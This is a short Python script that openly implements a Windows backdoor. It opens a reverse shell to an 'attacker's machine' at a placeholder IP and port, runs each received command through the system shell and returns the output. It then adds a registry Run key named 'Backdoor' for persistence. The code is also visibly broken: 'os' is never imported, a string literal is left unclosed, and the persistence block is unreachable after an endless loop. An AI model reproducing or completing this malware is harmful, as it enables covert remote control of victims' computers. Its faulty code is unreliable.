import socket
import subprocess
import winreg as reg

key = reg.HKEY_CURRENT_USER
key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
value_name = "Backdoor"

HOST = '000.000.0.00  # Replace with your IP address
PORT = 0000  # Replace with a preferred port number

# Create a socket object
s = socket.socket()

# Connect to the attacker's machine
s.connect((HOST, PORT))

# Receive commands from the attacker's machine and execute them
while True:
	command = s.recv(1024)
	if command[:2].decode('utf-8') == 'cd':
		# Change the current working directory
		try:
			os.chdir(command[3:].decode('utf-8'))
		except:
			pass
	if len(command) > 0:
		# Execute the command and send the output back to the attacker's machine
		output = subprocess.Popen(command[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output_bytes = output.stdout.read() + output.stderr.read()
		output_str = str(output_bytes, 'utf-8')
		s.send(str.encode(output_str + str(os.getcwd()) + '> '))

def launch_app(self, app_name):
	try:
		subprocess.Popen(app_name)
		return "Successfully launched %s" % app_name
	except Exception as e:
		return "Error launching %s: %s" % (app_name, str(e))

s.close()

try:
	reg_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
	reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, r"python C:\path\to\shell.py")
	reg_key.Close()
	print("Successfully added registry key for persistence")
except Exception as e:
	print("Error adding registry key for persistence:", str(e))
